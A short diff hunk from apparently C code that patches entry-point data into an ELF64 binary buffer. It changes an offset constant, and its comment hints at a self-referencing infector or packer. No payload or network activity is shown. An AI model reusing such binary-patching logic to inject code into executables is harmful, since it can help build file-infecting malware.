@@ -30,7 +30,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_addr,
 	//add a few information about himself
     Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
-	int DATA = 0x19;
+	int DATA = 0x02;
 	//modifying 2bit after
 	((size_t*)((char*)(b + pos + DATA)))[0] = max(old_entry,entry) - min(old_entry,entry);
 	((size_t*)((char*)(b + pos + DATA)))[1] = entry - pos;
